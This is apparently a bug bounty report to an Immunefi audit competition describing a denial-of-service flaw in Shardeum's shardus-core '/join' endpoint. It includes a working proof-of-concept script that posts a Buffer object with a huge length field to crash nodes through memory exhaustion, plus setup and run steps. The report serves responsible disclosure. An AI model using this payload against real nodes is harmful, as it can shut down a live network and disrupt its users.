# #39811 \[BC-Critical] inducing large memory allocation via join endpoint

## #39811 \[BC-Critical] Inducing large memory allocation via /join endpoint

**Submitted on Feb 7th 2025 at 21:48:26 UTC by @ZhouWu for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #39811
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/shardus-core/tree/bugbounty>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

### Description

## Description

In core code there's a http POST endpoint called '/join'. The endpoint handler for some reason will try to stringify the http body and parse it again. The problem lies within these custom stringify function. The buggy stringify function will try to stringify a buffer object with the supplied length without actually checking if the content are actually valid. This lead to extremely large memory allocation of node and eventually crashing.

This is the affected area of code in `src/p2p/Join/routes.ts`

```javascript
const joinRoute: P2P.P2PTypes.Route<Handler> = {
  method: 'POST',
  name: 'join',
  // eslint-disable-next-line @typescript-eslint/ban-ts-comment
  // @ts-ignore
  handler: async (req, res) => {
  

  try {
      const joinRequest: JoinRequest = Utils.safeJsonParse(Utils.safeStringify(req.body))

      // Validate the joinReq against the ajv schema
      const errors = verifyPayload(AJVSchemaEnum.JoinReq, joinRequest);
      if (errors) {
        res.status(400).json({
          success: false,
          fatal: true,
          reason: 'Validation error: ' + errors.join('; ')
        });
        return
      }

.... // more code 
```

### Proof of Concept

## Proof of Concept

1. Launch a local network to act as legitimate network.
2. create a folder to save our exploit script `mkdir exploit` and `cd exploit`
3. Create a file called `exploit.js` with the following content:

```javascript
const axios = require('axios');

const ip = process.argv[2];
const port = process.argv[3];
const url = `http://${ip}:${port}/join`;

const payload = {
    joinRequest: {
        type: "Buffer", 
        data: { length: 4294967295 }
    }
}

axios.post(url, payload)
```

4. Save the following content in `package.json`

```json
{
  "name": "stringify",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "dependencies": {
    "@shardus/types": "^1.2.21",
    "axios": "^1.7.9"
  }
}
```

5. Wait for node to come online.
6. Run the following command to install the dependencies `npm install`
7. Run the following command to execute the exploit `node exploit.js <ip> <port>`. Example `node exploit.js 0.0.0.0 9008`
8. Check the memory of the node via shardus cli or task manager it'll have multi gigabytes of memory.

## Impact

Large memory allocation in node process eventually leading to node crash. Can be used to perform a denial of service attack to the whole network. Total Network shutdown.
